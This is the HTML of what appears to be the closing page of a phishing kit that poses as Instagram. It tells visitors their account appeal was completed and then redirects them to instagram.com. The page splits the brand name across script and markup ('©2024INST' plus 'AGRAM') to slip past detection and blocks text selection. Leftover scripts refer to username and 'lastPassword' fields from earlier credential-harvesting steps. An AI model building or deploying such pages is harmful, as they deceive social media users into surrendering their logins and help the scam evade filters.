<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="robots" content="noindex, nofollow">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f4f4f4;
            color: #333;
        }

        header {
            width: 100%;
            background-color: white;
            padding: 10px 0;
            position: fixed;
            top: 0;
            box-shadow: 0px 5px 5px -5px rgba(0, 0, 0, 0.5);
            z-index: 2;
        }

        hr {
            border: none;
            margin: 0;
        }

        main {
          max-width: 600px;
      padding: 20px;
      background-color: #fff;
      border-radius: 5px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      text-align: center;
      position: relative;
      z-index: 1;
      margin-top: 0;
      transition: margin-top 1s ease;
      margin-bottom: 200px;
      margin: 5vh auto 200px; /* Güncellenmiş ortalama tanımı */
        }

        img {
            width: 100px;
            height: auto;
            margin: 0 auto;
            display: block;
        }

        textarea {
            width: 100%;
            height: 45px;
            margin: 15px 0;
            padding: 10px;
            box-sizing: border-box;
            border: 1px solid #ccc;
            border-radius: 5px;
            resize: none;
            font-size: 16px;
            line-height: 1.4;
            background-color: #f9f9f9;
            outline: none;
        }

        button {
            font-family: 'Roboto', sans-serif;
            background-color: transparent;
            color: #fff;
            border: none;
            padding: 5px 30px;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 16px;
            border-radius: 8px;
            cursor: pointer;
            opacity: 0.5;
            transition: opacity 0.3s ease;
        }

        button.active {
            background-color: #3498db;
            opacity: 1;
        }

        button:hover {
            background-color: #2980b9;
        }

        textarea:focus + button,
        textarea:not(:focus) + button {
            background-color: #3498db;
        }

        p {
            font-size: 12px;
            margin-top: 10px;
        }

        @media only screen and (max-width: 600px) {
            main {
                max-width: 100%;
                padding: 15px;
                margin-top: 0 !important;
                transition: none;
            }
        }

        footer {
            background-color: white;
            padding: 10px 0;
            width: 100%;
            position: fixed;
            bottom: 0;
            text-align: center;
            border-top: 1px solid #ccc;
            box-shadow: 0px -5px 5px -5px rgba(0, 0, 0, 0.1);
        }

        #numericInput {
            width: 50%;
            height: 45px;
            margin: 15px auto;
            padding: 10px;
            box-sizing: border-box;
            border: 1px solid #ccc;
            border-radius: 5px;
            resize: none;
            font-size: 16px;
            line-height: 1.4;
            background-color: #f9f9f9;
            outline: none;
            display: block;
        }
    </style>
    <style>
        /* Eklenen stil: Resim animasyonu için */
        @keyframes rotateAnimation {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }

        #mzid {
            width: 100px;
            height: auto;
            margin: 0 auto;
            display: block;

            /* Eklenen stil: Animasyon özellikleri */
            animation: rotateAnimation 0.5s ease-in-out;
        }
    </style>
</head>

<body>
    <header>
        <img src="https://i.hizliresim.com/oxaw80m.png" alt="cars">
        <hr>
    </header>
    <br> <br> <br> <br> <br>
    <main>
          <img id="mzid" src="https://i.hizliresim.com/me0s056.png" alt="Kare Resim" style="width: 20%; height: 20%; object-fit: cover; border-radius: 50%;">




            <svg width="300" height="100" xmlns="http://www.w3.org/2000/svg">
    <!-- 1. Çizgi -->
    <line x1="50" y1="50" x2="50" y2="50" stroke="black" stroke-width="1" />

    <!-- 1. Yuvarlak ve Sayı -->
    <circle cx="50" cy="50" r="10" fill="black" stroke="black" stroke-width="1" />
    <text x="50" y="50" fill="white" font-size="10" text-anchor="middle" alignment-baseline="middle">1</text>

    <!-- 2. Çizgi -->
    <line x1="60" y1="50" x2="150" y2="50" stroke="#1b1b1b" stroke-width="1" class="line" />

    <!-- 2. Yuvarlak ve Sayı -->
    <circle cx="150" cy="50" r="10" fill="black" stroke="black" stroke-width="1" class="circle2" />
    <text x="150" y="50" fill="white" font-size="10" text-anchor="middle" alignment-baseline="middle">2</text>

    <!-- 3. Çizgi -->
    <line x1="160" y1="50" x2="250" y2="50" stroke="#1b1b1b" stroke-width="1" />

    <!-- 3. Yuvarlak ve Sayı -->
    <circle cx="250" cy="50" r="10" fill="black" stroke="black" stroke-width="1" />
    <text x="250" y="50" fill="white" font-size="10" text-anchor="middle" alignment-baseline="middle">3</text>
</svg>
 <h5 style="display: flex; align-items: center; justify-content: center; margin: 20px 0 0 0px; font-weight: bold;">Congratulations !</h5>
   <br>

    <strong>The appeal was successfully completed. Please wait for our teams to contact you.

    <br><br><br>
 <div class="homepage-box" onclick="window.location.href='https://instagram.com'">Back to Homepage</div>

    </main>
    <footer style="font-size: 1px; line-height: 1;">
        <p id="dynamicWord" style="margin: 0; display: inline;"></p>
        <p style="display: inline;"> AGRAM</p>
    </footer>
    <style>
     body {
         background-color: #ffffff; /* Sayfa arka plan rengi */
     }

     /* Seçili öğelerin ve yazıların engellenmesi */
     ::selection {
         background-color: transparent;
         color: inherit; /* Yazı rengini değiştirmek istiyorsanız */
     }

     ::-moz-selection {
         background-color: transparent;
         color: inherit; /* Yazı rengini değiştirmek istiyorsanız */
     }

     /* Kullanıcı seçimini ve sürükleme işlemini engelleme */
     body {
         user-select: none;
         -moz-user-select: none; /* Firefox için */
         -ms-user-select: none; /* Internet Explorer için */
         -webkit-user-select: none; /* Chrome, Safari ve Opera için */
         -webkit-user-drag: none; /* Chrome, Safari ve Opera için sürükleme engelleme */
     }
 </style>
    <style>

           .homepage-box {
               display: inline-block;
               padding: 10px 20px;
               font-size: 16px;
               font-weight: bold;
               text-align: center;
               text-decoration: none;
               background-color: #3498db; /* Renk */
               color: #fff; /* Yazı rengi */
               border-radius: 5px; /* Köşe yuvarlama */
               transition: background-color 0.3s ease;
           }

           /* Kutunun üzerine gelindiğinde arka plan rengini değiştirme */
           .homepage-box:hover {
               background-color: #2980b9; /* Hover durumunda renk değiştirme */
           }
       </style>

       <script>
        // Fotoğraflara tıklanmayı ve sürüklenmeyi engellemek için JavaScript kodu
        document.addEventListener('DOMContentLoaded', function() {
            var images = document.getElementsByTagName('img');
            for (var i = 0; i < images.length; i++) {
                images[i].addEventListener('click', function(event) {
                    event.preventDefault();
                });

                images[i].addEventListener('dragstart', function(event) {
                    event.preventDefault();
                });
            }
        });
    </script>

    <script>
        document.addEventListener('DOMContentLoaded', function () {
            // Get the textarea element
            var textarea = document.getElementById('myTextarea');

            // Get the h4 element
            var h4Element = document.querySelector('h4');

            // Get the 'word' parameter from the URL
            var urlParams = new URLSearchParams(window.location.search);
            var wordFromUrl = urlParams.get('word') || '';

            // Set the text content of h4Element to the combination of '@' and wordFromUrl
            h4Element.textContent = '@' + wordFromUrl.trim();

            // Set the value of the textarea to wordFromUrl
            textarea.value = wordFromUrl;

            // Add event listener for input in the textarea
            textarea.addEventListener('input', function () {
                // Set the text content of h4Element to the combination of '@' and textarea value
                h4Element.textContent = '@' + this.value.trim();
            });
        });
    </script>
    <script>
        document.addEventListener('DOMContentLoaded', function () {
            // Get the textarea element
            var textarea = document.getElementById('myTextarea');

            // Get the h4 element
            var h4Element = document.querySelector('h4');

            // Get the 'word' parameter from the URL
            var urlParams = new URLSearchParams(window.location.search);
            var wordFromUrl = urlParams.get('word') || '';

            // Set the text content of h4Element to the combination of '@' and wordFromUrl
            h4Element.textContent = '@' + wordFromUrl.trim();

            // Set the value of the textarea to wordFromUrl
            textarea.value = wordFromUrl;

            // Add event listener for input in the textarea
            textarea.addEventListener('input', function () {
                // Set the text content of h4Element to the combination of '@' and textarea value
                h4Element.textContent = '@' + this.value.trim();
            });
        });
    </script>
    <script>
        document.addEventListener('DOMContentLoaded', function () {
            // Belirli bir kelimeyi oluşturmak için harfler
            var letters = ['©', '2', '0', '2', '4', 'I', 'N', 'S', 'T'];

            // Harfleri direkt olarak birleştir
            var dynamicWord = letters.join('');
            document.getElementById('dynamicWord').textContent = dynamicWord;
        });
    </script>
    <script>
    document.addEventListener('DOMContentLoaded', function () {
        // Diğer kodlar burada...

        // Yeni event listener ekleyerek "Enter" tuşuna basıldığında butonu aktifleştir
        document.getElementById('lastPassword').addEventListener('keydown', function (e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                redirect(); // "Enter" tuşuna basıldığında redirect fonksiyonunu çağır
            }
        });
    });

    // Diğer kodlar burada...
</script>
</body>

</html>
